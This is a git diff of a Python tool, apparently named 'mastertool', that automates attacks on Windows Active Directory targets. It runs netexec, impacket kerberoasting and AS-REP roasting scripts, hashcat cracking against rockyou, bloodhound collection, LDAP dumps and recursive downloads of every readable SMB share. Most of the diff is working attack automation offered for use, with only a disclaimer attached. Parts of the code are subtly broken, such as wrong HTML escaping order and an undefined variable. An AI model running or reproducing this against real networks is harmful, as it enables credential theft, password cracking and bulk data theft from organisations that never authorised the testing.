@@ -1,141 +1,28 @@
+from pathlib import Path
+from urllib.parse import urlparse
 import argparse
-import os
-import shutil
-import sys
-import subprocess
-import socket
-import re
 import ipaddress
-import urllib.request
-# application class 
+import ntplib
+import re
+import shlex
+import shutil
+import socket
+import subprocess
 
-class AppArg:
-    def __init__(self, username='', domain='', password='', ntlm_hash='',usersfile='',
-                 target='', wordlist='rockyou.txt', kerberos=False, ldap=False,
-                 smb=False, full=False, winrm=False, bloodhound=False, crack=False,lookupsid=False,userspn=False,npusers=False,setup=False):
-        self._username = username
-        self._domain = domain
-        self._password = password
-        self._ntlm_hash = ntlm_hash
-        self._target = target
-        self._wordlist = wordlist
-        self._usersfile = usersfile
-        self._kerberos = kerberos
-        self._lookupsid = lookupsid
-        self._npusers = npusers
-        self._userspn = userspn
-        self._ldap = ldap
-        self._smb = smb
-        self._full = full
-        self._winrm = winrm
-        self._bloodhound = bloodhound
-        self._crack = crack
-        self._setup = setup
+RED = "\033[1;31m"
+BLUE = "\033[1;34m"
+RESET = "\033[0m"
+GREEN = "\033[1;32m"
+PURPLE = "\033[1;35m"
+ORANGE = "\033[1;33m"
+PINK = "\033[1;35m"
 
-    @property
-    def username(self):
-        return self._username
-
-    @property
-    def domain(self):
-        return self._domain
-
-    @property
-    def password(self):
-        return self._password
-
-    @property
-    def ntlm_hash(self):
-        return self._ntlm_hash
-
-    @property
-    def target(self):
-        return self._target
-
-    @property
-    def wordlist(self):
-        return self._wordlist
-
-    @property
-    def usersfile(self):
-        return self._usersfile
-    
-    @property
-    def kerberos(self):
-        return self._kerberos
-    
-    @property
-    def lookupsid(self):
-        return self._lookupsid
-    
-    @property
-    def npusers(self):
-        return self._npusers
-    
-    @property
-    def userspn(self):
-        return self._userspn
-
-    @property
-    def ldap(self):
-        return self._ldap
-
-    @property
-    def smb(self):
-        return self._smb
-
-    @property
-    def full(self):
-        return self._full
-
-    @property
-    def winrm(self):
-        return self._winrm
-
-    @property
-    def bloodhound(self):
-        return self._bloodhound
-
-    @property
-    def crack(self):
-        return self._crack
-    
-    @property
-    def setup(self):
-        return self._setup
+########## MESSAGES ##########
 
 
-
-def create_directories_if_not_exist(*directories):
-    for directory in directories:
-        if not os.path.exists(directory):
-            os.makedirs(directory)
-
-
-
-def create_files_if_not_exist(*files):
-    for file_path in files:
-        if not os.path.exists(file_path):
-            with open(file_path, "w") as file:
-                file.write("")  # Write an empty string to the file
-
-
-
-
-
-
-RED="\033[1;31m"
-BLUE="\033[1;34m"
-RESET="\033[0m"
-GREEN="\033[1;32m"
-PURPLE="\033[1;35m"
-ORANGE="\033[1;33m"
-PINK="\033[1;35m"
-
-
-# script banner
 def display_banner():
-	print(f"""{GREEN}
+    print(
+        f"""{GREEN}
 
         	         ██████╗██╗ ██████╗ █████╗ ██████╗  █████╗                    
                         ██╔════╝██║██╔════╝██╔══██╗██╔══██╗██╔══██╗                   
@@ -151,571 +38,555 @@ def display_banner():
         ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗   ██║   ██║   ██║██
         ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║   ██║   ╚██████╔╝███████╗
         ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝                                                                          
-        	{RESET}{display_disclaimer()}""")
- 
+        	{RESET}{display_disclaimer()}"""
+    )
+
+
 def display_disclaimer():
-     return f"""
+    return f"""
            {ORANGE}| Disclaimer |                                                                                       |
                         | {RED}Usage of this pentest tool implies understanding and acceptance of potential risks,   {ORANGE}|
                         | {RED}and the user assumes full responsibility for their actions.                           {ORANGE}|
            {RESET}"""
-# argument management 
-def get_parser():
-    parser = argparse.ArgumentParser(description='Script description')
-    parser.add_argument('-u', '--username', help='Username for authentication')
-    parser.add_argument('-d', '--domain', help='Domain name of the target machine')
-    parser.add_argument('-p', '--password', help='Password for authentication')
-    parser.add_argument('-H', '--ntlm-hash', help='NTLM Hash for authentication')
-    parser.add_argument('-t', '--target', help='Target host or IP address')
-    parser.add_argument('-w', '--wordlist', default='rockyou.txt', help='Password list (default: rockyou.txt)')
-    parser.add_argument('--setup', action='store_true', help='Fix Impacket scripts')
-    parser.add_argument('-us', '--usersfile', help='List of domain users')
-    parser.add_argument('--kerberos', action='store_true', help='Enable kerberoasting mode')
-    parser.add_argument('--lookupsid', action='store_true', help='Enable lookupsid mode')
-    parser.add_argument('--npusers', action='store_true', help='Enable GetNPUsers mode')
-    parser.add_argument('--userspn', action='store_true', help='Enable GetUserSPNs mode')
-    parser.add_argument('--ldap', action='store_true', help='Enable LDAP mode Enumeration')
-    parser.add_argument('--smb', action='store_true', help='Enable SMB mode Enumeration')
-    parser.add_argument('--full', action='store_true', help='Enable full mode Enumeration')
-    parser.add_argument('--winrm', action='store_true', help='Enable winrm mode Enumeration')
-    parser.add_argument('--bloodhound', action='store_true', help='Enable bloodhound mode Enumeration')
-    parser.add_argument('--crack', action='store_true', help='Crack Found Hashes')
-    return parser
-
-def get_args(parser):
-	    return parser.parse_args()
-
- 
-def args_to_app_args(args):
-    return AppArg(**vars(args))
-
-# get arguments
-parser = get_parser()
-arguments = get_args(parser)
-app_args = args_to_app_args(arguments)
-flag_supplied = app_args.full or app_args.kerberos or app_args.smb or app_args.winrm or app_args.lookupsid or app_args.ldap or app_args.bloodhound or app_args.npusers or app_args.userspn
-current_directory_map = {}
-base_directory_map = {}
-target_directory_map = {}
-smb_directory_map = {}
-lookupsid_directory_map = {}
-kerberos_directory_map = {}
-ldap_directory_map = {}
-smb_shares_directory_map = {}
-bloodhound_directory_map = {}
-
-# File paths maps
-get_np_users_file_map = {}
-get_user_spn_file_map = {}
-npusers_cracked_file_map = {}
-userspn_cracked_file_map = {}
-lookupsid_file_map = {}
-users_file_map = {}
-smb_file_map = {}
-smb_shares_file_map = {}
-host_file = "/etc/hosts" 
-# Define directory paths
-def initialize_directories(ip_addresses):  
-    for ip in ip_addresses:
-        current_directory = os.getcwd()
-        current_directory_map[ip] = current_directory
-
-        base_directory = os.path.join(current_directory, "mastertul")
-        base_directory_map[ip] = base_directory
-
-        target_directory = os.path.join(base_directory, ip)
-        target_directory_map[ip] = target_directory
-
-        smb_directory = os.path.join(target_directory, "smb_results")
-        smb_directory_map[ip] = smb_directory
-
-        lookupsid_directory = os.path.join(target_directory, "lookupsid_results")
-        lookupsid_directory_map[ip] = lookupsid_directory
-
-        kerberos_directory = os.path.join(target_directory, "kerberos_results")
-        kerberos_directory_map[ip] = kerberos_directory
-
-        ldap_directory = os.path.join(target_directory, "ldap_results")
-        ldap_directory_map[ip] = ldap_directory
-
-        smb_shares_directory = os.path.join(smb_directory, "smb")
-        smb_shares_directory_map[ip] = smb_shares_directory
-
-        bloodhound_directory = os.path.join(target_directory, "bloodhound_results")
-        bloodhound_directory_map[ip] = bloodhound_directory
-        
-        # Define file paths and store them in the corresponding maps
-        get_np_users_file = os.path.join(kerberos_directory, "GetNPUsers_results.txt")
-        get_np_users_file_map[ip] = get_np_users_file
-
-        get_user_spn_file = os.path.join(kerberos_directory, "GetUserSPNs_results.txt")
-        get_user_spn_file_map[ip] = get_user_spn_file
-
-        npusers_cracked_file = os.path.join(kerberos_directory, "npusers_cracked_hashes.txt")
-        npusers_cracked_file_map[ip] = npusers_cracked_file
-
-        userspn_cracked_file = os.path.join(kerberos_directory, "userspn_cracked_hashes.txt")
-        userspn_cracked_file_map[ip] = userspn_cracked_file
-
-        lookupsid_file = os.path.join(lookupsid_directory, "lookupsid_file.txt")
-        lookupsid_file_map[ip] = lookupsid_file
-
-        users_file = os.path.join(lookupsid_directory, "users.txt")
-        users_file_map[ip] = users_file
-
-        smb_file = os.path.join(smb_directory, "share_drives.txt")
-        smb_file_map[ip] = smb_file
-
-        smb_shares_file = os.path.join(smb_shares_directory, "share_names.txt")
-        smb_shares_file_map[ip] = smb_shares_file
-
-     # Create directories if they do not exist
-        os.makedirs(smb_directory, exist_ok=True)
-        os.makedirs(lookupsid_directory, exist_ok=True)
-        os.makedirs(kerberos_directory, exist_ok=True)
-        os.makedirs(ldap_directory, exist_ok=True)
-        os.makedirs(smb_shares_directory, exist_ok=True)
-        os.makedirs(bloodhound_directory, exist_ok=True) 
-
-         # Create files if they don't exist
-        for file_path in [get_np_users_file, get_user_spn_file, npusers_cracked_file, userspn_cracked_file, lookupsid_file, users_file, smb_file, smb_shares_file]:
-            if not os.path.exists(file_path):
-                open(file_path, 'a').close()
 
 
-def cmd_ref(alive_ip):
-    print('----------------------------------------------------')
-    if len(alive_ip) == 1:
-        print(f'Target IP: {ORANGE}{alive_ip[0]}{RESET}')
+def display_hunt_message():
+    print(f"{RESET}{PURPLE}{'-'*16}{GREEN}H{ORANGE}A{BLUE}P{RED}P{GREEN}Y{ORANGE} {BLUE}H{RED}A{GREEN}U{ORANGE}N{BLUE}T{RED}I{GREEN}N{ORANGE}G{BLUE}!{RED}!{PURPLE}{'-'*16}{PURPLE}{RESET}")
+
+
+def seperator(length=48, color=RESET):
+    print(f"{color}{'-'*length}{RESET}")
+
+
+def display_args_info(ip):
+    display_hunt_message()
+    print(f"Target IP: {ORANGE}{ip}{RESET}")
+    if args.domain:
+        print(f"Domain: {ORANGE}{args.domain}{RESET}")
+    print(f'Username: {ORANGE}{args.username or "null"}{RESET}')
+    print(f'Password: {ORANGE}{args.password or "null"}{RESET}')
+    if args.ntlm_hash:
+        print(f"NTLM Hash: {ORANGE}{args.ntlm_hash}{RESET}")
+    if args.full:
+        print(f"\n{BLUE}Full Mode Enabled{RESET}")
     else:
-        print(f'Target Network: {ORANGE}{app_args.target}{RESET}')
-        print(f'Alive IP Addresses: {ORANGE}{alive_ip}{RESET}')
-
-    if app_args.domain:
-        print(f'Domain: {ORANGE}{app_args.domain}{RESET}')
-    print(f'Username: {ORANGE}{app_args.username}{RESET}')
-    if app_args.password:
-        print(f'Password: {ORANGE}{app_args.password}{RESET}')
-    if app_args.ntlm_hash:
-        print(f'NTLM Hash: {ORANGE}{app_args.ntlm_hash}{RESET}')
-        
-    if not app_args.full:
-        if app_args.kerberos:
-            print(f'{BLUE}Kerberoasting Mode Enabled{RESET}')
+        print()
+        if args.kerberos:
+            print(f"{BLUE}Kerberoasting Mode Enabled{RESET}")
         else:
-            if app_args.lookupsid:
-                print(f'{BLUE}Lookupsid Mode Enabled{RESET}')
-            if app_args.npusers:
-                print(f'{BLUE}GetNPUsers Mode Enabled{RESET}')
-            if app_args.userspn:
-                print(f'{BLUE}GetUserSPNs Mode Enabled{RESET}')
-                
-        if app_args.ldap:
-            print(f'{BLUE}LDAP Mode Enabled{RESET}')
-        if app_args.smb:
-            print(f'{BLUE}SMB Mode Enabled{RESET}')
-        if app_args.winrm:
-            print(f'{BLUE}WinRM Mode Enabled{RESET}')
-        if app_args.bloodhound:
-            print(f'{BLUE}Bloodhound Mode Enabled{RESET}')
-        if app_args.crack:
-            print(f'{BLUE}Cracking Mode Enabled{RESET}')
-    if app_args.full or not flag_supplied:
-        print(f'{BLUE}Full Mode Enabled{RESET}')
-    print('----------------------------------------------------')
-    
-def validate_arguments():
-    if app_args.setup :
-        if  os.geteuid() == 0:
-            fix_impacket()
-        else:
-            print(f'{RED}[-] Run Setup as root{RESET}')  
-        sys.exit(1)
-    if not app_args.target :
-        parser.print_help()
-        sys.exit(1)
+            if args.lookupsid:
+                print(f"{BLUE}Lookupsid Mode Enabled{RESET}")
+            if args.npusers:
+                print(f"{BLUE}GetNPUsers Mode Enabled{RESET}")
+            if args.userspn:
+                print(f"{BLUE}GetUserSPNs Mode Enabled{RESET}")
 
-def setup_app(alive_ip):
-    # validate incoming arguments 
-    initialize_directories(alive_ip)
-    cmd_ref(alive_ip)
-    
+        if args.ldap:
+            print(f"{BLUE}LDAP Mode Enabled{RESET}")
+        if args.smb:
+            print(f"{BLUE}SMB Mode Enabled{RESET}")
+        if args.winrm:
+            print(f"{BLUE}WinRM Mode Enabled{RESET}")
+        if args.bloodhound:
+            print(f"{BLUE}Bloodhound Mode Enabled{RESET}")
+    seperator()
 
-def generate_cme_cmd(username,password,hash,server,crack_type,cmd):
-    message = f" crackmapexec {crack_type} {server} -u '{username}' -p '{password}' {cmd}"
-    if hash :
-        message = f" crackmapexec {crack_type} {server} -u '{username}' -H '{hash}' {cmd}"
-    return message
 
-def run_command(message):
+########## WORKSPACE ##########
+
+
+def workspace_get_names(ip: str) -> dict[str, dict[str, Path]]:
+    """
+    mastertool
+    └── 10.10.11.34
+        ├── bloodhound_results
+        ├── ldap_results
+        ├── kerberos_results
+        │   ├── GetNPUsers_results.txt
+        │   ├── GetUserSPNs_results.txt
+        ├── lookupsid_results
+        │   ├── lookupsid_file.txt
+        │   └── users.txt
+        └── smb_results
+            └── smb
+                ├── share_drives.txt
+                └── share_names.txt
+    """
+    cwd = Path.cwd()
+    base_dir = cwd / "mastertool" / ip
+
+    dirs = {
+        "cwd": cwd,
+        "base": base_dir,
+        "smb": base_dir / "smb_results",
+        "ldap": base_dir / "ldap_results",
+        "lookup_sids": base_dir / "lookupsid_results",
+        "kerberos": base_dir / "kerberos_results",
+        "bloodhound": base_dir / "bloodhound_results",
+    }
+
+    files = {
+        "kerberos": {
+            "np_users": dirs["kerberos"] / "GetNPUsers_results.txt",
+            "snp_users": dirs["kerberos"] / "GetUserSPNs_results.txt",
+        },
+        "lookup_sids": {
+            "lookup_sids": dirs["lookup_sids"] / "lookupsid.txt",
+            "users": dirs["lookup_sids"] / "users.txt",
+        },
+        "smb": {
+            "share_drives": dirs["smb"] / "share_drives.txt",
+            "share_names": dirs["smb"] / "share_names.txt",
+        },
+    }
+
+    return {"dirs": dirs, "files": files}
+
+
+def workspace_init(workspace=None, ip=None) -> Path:
+    if not workspace and ip:
+        workspace = workspace_get_names(ip)
+
+    dirs, files = workspace.values()
+
+    for dir_ in dirs.values():
+        Path(dir_).mkdir(parents=True, exist_ok=True)
+
+    for dir_ in files.values():
+        for file in dir_.values():
+            Path(file).touch(exist_ok=True)
+
+    return dirs["base"]
+
+
+def workspace_cleanup(directory: Path):
+    print(f"{BLUE}[!x!] Cleaning up...{RESET}")
+    for file_path in directory.rglob("*"):
+        if file_path.is_file() and file_path.stat().st_size == 0:
+            file_path.unlink()  # Delete the file
+
+    # Remove empty directories (bottom-up)
+    for dir_path in sorted(
+        directory.rglob("*"), key=lambda p: len(p.parts), reverse=True
+    ):
+        if dir_path.is_dir() and not any(dir_path.iterdir()):
+            dir_path.rmdir()  # Delete the directory
+
+
+########## SHELL ##########
+
+
+def gen_netexec_cmd(username, password, password_hash, ip, domain, service, cmd):
+    server = domain if domain else ip
+    command = f"netexec {service} {server} --timeout 99 -u '{username}' "
+    command += f"-H '{password_hash}'" if password_hash else f"-p '{password}'"
+    command += f" {cmd}"
+    if args.kerberos:
+        command += ' -k'
+    return command
+
+
+def run_command(command):
+    command = f"faketime -f +{args.faketime}h " + command
+    print(f"{PINK}[~] Commnad: {command}{RESET}")
     try:
-        command = subprocess.Popen(
-                        message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = command.stdout.read() + command.stderr.read()
-        return output.decode(encoding='cp1252')
+        output = subprocess.run(
+            shlex.split(command),
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+        )
+        return output.stdout, output.stderr
     except Exception as error:
-        return error
-    
-def list_smb_shares(username, password, hash, server):
-    print(f'{PURPLE}[!] Enumerating SMB...{RESET}')
-    command = generate_cme_cmd(username, password,hash, server, "smb", "--shares")
-    results =  run_command(command)
-    # Save to file 
-    if 'Pwn3d' in results:
-        pattern = r"\b(\w+)\s+READ\b"
-        matches = re.findall(pattern, results)
-        # Remove escape sequences and extract share names from the matches
-        share_names = [match for match in matches if match.upper() != "PERMISSIONS"]
+        return "", str(error)
+
+
+########## UTILS ##########
+
+
+def get_faketime(server):
+    skew = ntplib.NTPClient().request(server, version=3).offset
+    return int(round(skew / (60 * 60)))
+
+
+def save_to_file(filename, data):
+    with open(filename, "w") as f:
+        f.write(data)
+
+def netexec_ldap_dump_to_html(output):
+    def row(attr, value):
+        value = value.replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')
+        return f'<tr><td>{attr}</td><td class="val">{value}</td></tr>'
+
+    def table(title, rows):
+        return f'<h3>{title}</h3><table><tr><th>Attribute</th><th>Value</th></tr>{rows}</table>'
+
+    template = '''
+    <html>
+    <head><title>LDAP Dump</title><style>
+        table { width: 100%;  border-collapse: collapse; }
+        th { border: 1px solid black; padding: 8px; text-align: left; white-space: nowrap; }
+        td { border: 1px solid black; padding: 8px; text-align: left;}
+        .val { word-break: break-word; } 
+        th { background-color: #f2f2f2; }
+
+    </style></head>
+    <body>
+    <h1>LDAP Dump Results</h1>
+    '''
+
+    rows = ''
+    for line in output.strip().split('\n'):
+        line = line.split(maxsplit=4)[-1]
+        if '[+]' in line:
+            template += table(title=line, rows=rows)
+            rows = ''
+            continue
         
-        # save share names to file 
-        result_string = '\n'.join(share_names)
-        save_to_file(smb_shares_file_map[server],result_string)
-        print(f'{GREEN}[+] SMB share drive names saved to {smb_shares_file_map[server]}{RESET}')
-        
-        # save crackmap results to file
-        save_to_file(smb_file_map[server],results)
-        print(f'{GREEN}[+] SMB share drives list saved to {smb_file_map[server]}{RESET}')
-        
-        # Download smb files 
-        # download files
-        if len(share_names) >0:
-            print(f'{ORANGE}[*] Downloading SMB share files to {smb_shares_directory_map[server]}{RESET}')
-            for share_name in share_names:
-                download_smb_files(username,password,hash,server,share_name) 
-    else:
-        print(f'{RED}[-] Could not connect to SMB {RESET}')    
-         
-def save_to_file(destination,results):
-    with open(destination,'w') as file:
-            file.write(results)
-            
-def remove_empty_files(directory):
-    print(f"{BLUE} [!x!] Cleaning up...{RESET}")
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            filepath = os.path.join(root, file)
-            if os.path.getsize(filepath) == 0:
-                os.remove(filepath)
-    
-    for root,dirs, files in os.walk(directory):
-        for dir in dirs:
-            dirpath = os.path.join(root, dir)
-            # Check if the directory is empty
-            if not os.listdir(dirpath):
-                os.rmdir(dirpath)
-                
-            
-def download_smb_files(username,password,hash,server,share_name):
-    if username  and hash :
-        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory_map[server]};prompt OFF;recurse ON;mget *;exit;' -U '{username}' --pw-nt-hash '{hash}'"
-    if username  and password :
-        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory_map[server]};prompt OFF;recurse ON;mget *;exit;' -U '{username}%{password}'"
-    else:
-        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory_map[server]};prompt OFF;recurse ON;mget *;exit;' -N"
-    
-    run_command(smb_download)
-    
-    
-def enum_smb(username,password,hash,server):
-           list_smb_shares(username,password,hash,server)
+        if ':' not in line:
+            continue
+
+        attr, value = map(str.strip, line.split(':', 1))
+        rows += row(attr, value)
+
+    template += '</body></html>'
+    return template
 
 
-def enum_winrm(username,password,hash,server):
-    print(f'{PURPLE}{PURPLE}[!] Connecting to WinRM...{RESET}')
-    command = generate_cme_cmd(username,password,hash,server,'winrm','')
-    results =  run_command(command)
-    if 'Pwn3d' in results:
-        print(f'{GREEN}[+] Connected to WinRM{RESET}')
-    else:
-        print(f'{RED}[-] Could not connect to WinRM {RESET}')
-
-def gen_impacket_access(username,password,hash,server,domain):
-    if domain :
-        if username  and password :
-            message = f"'{domain}/{username}:{password}'@{server} "
-            return message
-        
-        if username  and hash :
-            message = f"'{domain}/{username}'@{server} -hashes :{hash} "
-            return message
-        
-        if not password:
-            message = f"'{domain}/{username}'@{server} -no-pass "
-            return message
-    else:
-        if username  and password :
-            message = f"'{username}:{password}'@{server} "
-            return message
-        
-        if username  and hash :
-            message = f"'{username}'@{server} -hashes :{hash} "
-            return message
-        
-        if not username or  not password:
-            message = f"'{username}'@{server} -no-pass "
-    return message 
-
-def enum_lookupsid(username,password,hash,server,domain):
-    print(f'{PURPLE}[!] Enumerating Lookupsids using impacket...{RESET}')
-    # Get Lookupsids
-    command = f"lookupsid.py {gen_impacket_access(username,password,hash,server,domain)}"
-    results = run_command(command)
-    if '[-] SMB SessionError:' in results:
-        print(f'{RED}[-] Could not find domain sids{RESET}')
-    else:
-        save_to_file(lookupsid_file_map[server],results)
-        print(f'{GREEN}[+] Lookupsids saved to {lookupsid_file_map[server]}{RESET}')
-        # Get users
-        command = f"lookupsid.py {gen_impacket_access(username,password,hash,server,domain)} |  awk -F '[:\\\\\\\\(\\\\)]' '/SidTypeUser/ {{print $3}}'"
-        results = run_command(command)
-        save_to_file(users_file_map[server],results)
-        print(f'{GREEN}[+] Users list saved to {users_file_map[server]}{RESET}')
-
-
-def get_NPUsers(username,password,hash,server,domain):
-    print(f"{PURPLE}[!] Enumerating NPUsers using impacket...{RESET}")
-    command = f"GetNPUsers.py {gen_impacket_access(username,password,hash,server,domain)} -usersfile {app_args.usersfile or users_file_map[server]} | grep '$krb5asrep' "
-    results = run_command(command)
-    if '$krb5asrep' in results:
-        save_to_file(get_np_users_file_map[server],results.split('/usr')[0])
-        print(f'{GREEN}[+] Saved NPUsers hashes to {get_np_users_file_map[server]}{RESET}')
-    else:
-        print(f'{RED}[-] No NPUsers found{RESET}')
-
-def get_UserSPNs(username,password,hash,server,domain):
-    print(f"{PURPLE}[!] Enumerating UserSPNs using impacket...{RESET}")
-    command = f"GetUserSPNs.py {gen_impacket_access(username,password,hash,server,domain)}  -request | grep '$krb5tgs' "
-
-    results = run_command(command)
-    if '$krb5tgs' in results:
-        save_to_file(get_user_spn_file_map[server],results.split('/usr')[0])
-        print(f'{GREEN}[+] Saved UserSPNs hashes to {get_user_spn_file_map[server]}{RESET}')
-    else:
-        print(f'{RED}[-] No UserSPNs found')
-
-def crack_hashes(server):
-    print(f"{PURPLE}[!] Cracking hashes using hashcat...{RESET}")
-    if get_np_users_file_map[server]:
-        command = f"hashcat {get_np_users_file_map[server]} {app_args.wordlist} -m 18200 | grep '$krb5asrep'| uniq "
-        results = run_command(command)
-        if results:
-            save_to_file(npusers_cracked_file_map[server],results)
-            print(f'{GREEN}[+] Cracked Kerberos NPUsers hashes saved to {npusers_cracked_file_map[server]}')
-        else:
-            print(f'{RED}[-] No Kerberos NPUsers hashes found')
-            
-    if get_user_spn_file_map[server]:
-        command = f"hashcat {get_user_spn_file_map[server]} {app_args.wordlist}  -m 13100  | grep '$krb5tgs' | uniq "
-        results = run_command(command)
-        if results:
-            save_to_file(userspn_cracked_file_map[server],results)
-            print(f'{GREEN}[+] Cracked Kerberos UserSPNs hashes saved to {userspn_cracked_file_map[server]}{RESET}')
-        else:
-            print(f'{RED}[-] No Kerberos UserSPNs hashes found{RESET}')
-
-def domain_to_dc(domain):
-    components = domain.split('.')
-    dc_components = ['DC=' + comp for comp in components]
-    return ','.join(dc_components)
-
-def enum_ldap(username,password,hash,server,domain):
-    print(f"{PURPLE}[!] Enumerating LDAP...{RESET}")
-    if domain :
-        if username  and password :
-            command = f"ldapdomaindump -u '{domain}\{username}'  -p '{password}' -dc-ip {server} -o {ldap_directory_map[server]}"
-    if not command:
-        print(f"{RED}[-] Could not connect to LDAP{RESET}")
-        sys.exit(1)
-    run_command(command)
-    files = os.listdir(ldap_directory_map[server])
-    if len(files) == 0:
-        print(f"{RED}[-] Could not connect to LDAP{RESET}")
-    else:
-        print(f'{GREEN}[+] LDAP saved to {ldap_directory_map[server]}{RESET}')
-
-def move_bloodhound_files(server):
-    files = os.listdir(current_directory_map[server])
-
-    # Filter the list to only include files ending with '.json'
-    json_files = [f for f in files if f.endswith('.json')]
-    if len(json_files) ==0:
-        print(f'{RED}[-] Could not collect Bloodhound Files{RESET}')
-        sys.exit(1)
-    # Move each JSON file to the destination directory
-    for file in json_files:
-        src_path = os.path.join(current_directory_map[server], file)
-        dest_path = os.path.join(bloodhound_directory_map[server], file)
-        shutil.move(src_path, dest_path)
-    print(f'{GREEN}[+] Bloodhound saved to {bloodhound_directory_map[server]}')
-        
-        
-def enum_bloodhound(username,password,hash,server,domain):
-    print(f"{PURPLE}[!] Collecting Bloodhound Files...{RESET}")
-    if username  and password :
-        command = f"bloodhound-python -d {domain} -u '{username}' -p '{password}' -ns {server} -c all"  
-    if username  and hash :
-        command = f"bloodhound-python -d {domain} -u '{username}' --hashes '{hash}' -ns {server} -c all"    
-    run_command(command)
-    move_bloodhound_files(server)
-
-
-
-def fix_impacket_array():
-    arr = [
-        'addcomputer.py', 'atexec.py', 'dcomexec.py', 'dpapi.py', 'esentutl.py', 'findDelegation.py', 'GetADUsers.py',
-        'getArch.py', 'GetNPUsers.py', 'getPac.py', 'getST.py', 'getTGT.py', 'GetUserSPNs.py', 'goldenPac.py',
-        'karmaSMB.py', 'kintercept.py', 'lookupsid.py', 'mimikatz.py', 'mqtt_check.py', 'mssqlclient.py',
-        'mssqlinstance.py', 'netview.py', 'nmapAnswerMachine.py', 'ntfs-read.py', 'ntlmrelayx.py', 'ping6.py',
-        'ping.py', 'psexec.py', 'raiseChild.py', 'rdp_check.py', 'registry-read.py', 'reg.py', 'rpcdump.py',
-        'rpcmap.py', 'sambaPipe.py', 'samrdump.py', 'secretsdump.py', 'services.py', 'smbclient.py', 'smbexec.py',
-        'smbrelayx.py', 'smbserver.py', 'sniffer.py', 'sniff.py', 'split.py', 'ticketConverter.py', 'ticketer.py',
-        'wmiexec.py', 'wmipersist.py', 'wmiquery.py', 'addcomputer.pyc', 'atexec.pyc', 'dcomexec.pyc', 'dpapi.pyc',
-        'esentutl.pyc', 'findDelegation.pyc', 'GetADUsers.pyc', 'getArch.pyc', 'GetNPUsers.pyc', 'getPac.pyc',
-        'getST.pyc', 'getTGT.pyc', 'GetUserSPNs.pyc', 'goldenPac.pyc', 'karmaSMB.pyc', 'kintercept.pyc',
-        'lookupsid.pyc', 'mimikatz.pyc', 'mqtt_check.pyc', 'mssqlclient.pyc', 'mssqlinstance.pyc', 'netview.pyc',
-        'nmapAnswerMachine.pyc', 'ntfs-read.pyc', 'ntlmrelayx.pyc', 'ping6.pyc', 'ping.pyc', 'psexec.pyc',
-        'raiseChild.pyc', 'rdp_check.pyc', 'registry-read.pyc', 'reg.pyc', 'rpcdump.pyc', 'rpcmap.pyc', 'sambaPipe.pyc',
-        'samrdump.pyc', 'secretsdump.pyc', 'services.pyc', 'smbclient.pyc', 'smbexec.pyc', 'smbrelayx.pyc',
-        'smbserver.pyc', 'sniffer.pyc', 'sniff.pyc', 'split.pyc', 'ticketConverter.pyc', 'ticketer.pyc', 'wmiexec.pyc',
-        'wmipersist.pyc', 'wmiquery.pyc'
-    ]
-
-    for impacket_file in arr:
-        paths = [
-            f"/usr/bin/{impacket_file}",
-            f"/usr/local/bin/{impacket_file}",
-            f"{os.path.expanduser('~')}/.local/bin/{impacket_file}",
-            f"/home/$finduser/.local/bin/{impacket_file}"
-        ]
-        for path in paths:
-            if os.path.exists(path):
-                os.remove(path)
-
-def fix_impacket():
-    # Uninstall impacket
-    run_command("pip uninstall impacket -y")
-    run_command("pip3 uninstall impacket --break-system-packages -y")
-
-    print(f"{ORANGE}*******************************************************************{RESET}")
-    print(f"{BLUE}[!x!] Fixing and installing Impacket Scripts...{RESET}")
-    print(f"{ORANGE}*******************************************************************{RESET}")
+def parse_and_resolve(ip_or_url):
     try:
-        # Clean impacket files
-        fix_impacket_array()
-
-        # Download and install impacket
-        run_command("wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz -O /tmp/impacket-0.9.19.tar.gz")
-        run_command("tar xfz /tmp/impacket-0.9.19.tar.gz -C /opt")
-        os.chdir("/opt")
-        shutil.chown("impacket-0.9.19", user="root", group="root")
-        os.chmod("impacket-0.9.19", 0o755)
-        os.chdir("/opt/impacket-0.9.19")
-        run_command("pip install -r requirements.txt")
-        run_command("/bin/python2.7 ./setup.py install")
-        run_command("sudo -i -u $findrealuser pip install ldap3==2.5.1")
-        run_command("pip install ldap3==2.5.1")
-        os.remove("/tmp/impacket-0.9.19.tar.gz")
-        run_command("apt -y reinstall python3-impacket impacket-scripts")
-
-        # Print installed packages
-        print("\n  Installed: impacket-0.9.19 python-pip wheel impacket flask pyasn1")
-        print("\n  Installed: lsassy pycryptodomes pyOpenSSL ldap3 ldapdomaindump")
-        print("\n  Installed: python3-pip python3-impacket impacket-scripts")
-        print(f"{GREEN}[+] Done!! Enjoy!{RESET}")
-    except e:
-        print(f"{RED}[-] {str(e)}{RESET}")
-
-
-def handle_request(username,password,hash,server,domain):
-    if app_args.full or not flag_supplied:
-        enum_smb(username,password,hash,server)
-        enum_winrm(username,password,hash,server)
-        enum_lookupsid(username,password,hash,server,domain)
-        get_NPUsers(username,password,hash,server,domain)
-        get_UserSPNs(username,password,hash,server,domain)
-        enum_bloodhound(username,password,hash,server,domain)
-        enum_ldap(username,password,hash,server,domain)
-    else:
-        if app_args.kerberos:
-            enum_lookupsid(username,password,hash,server,domain)
-            get_NPUsers(username,password,hash,server,domain)
-            get_UserSPNs(username,password,hash,server,domain)
-        if app_args.smb:
-            enum_smb(username,password,hash,server)
-        
-        if app_args.winrm:
-            enum_winrm(username,password,hash,server)
-        
-        if app_args.lookupsid and not app_args.kerberos:
-            enum_lookupsid(username,password,hash,server,domain)
-        
-        if app_args.ldap:
-            enum_ldap(username,password,hash,server,domain)
-        
-        if app_args.bloodhound:
-            enum_bloodhound(username,password,hash,server,domain)
-        
-        if app_args.npusers and not app_args.kerberos:
-            get_NPUsers(username,password,hash,server,domain)
-        
-        if app_args.userspn and not app_args.kerberos:
-            get_UserSPNs(username,password,hash,server,domain)
-    
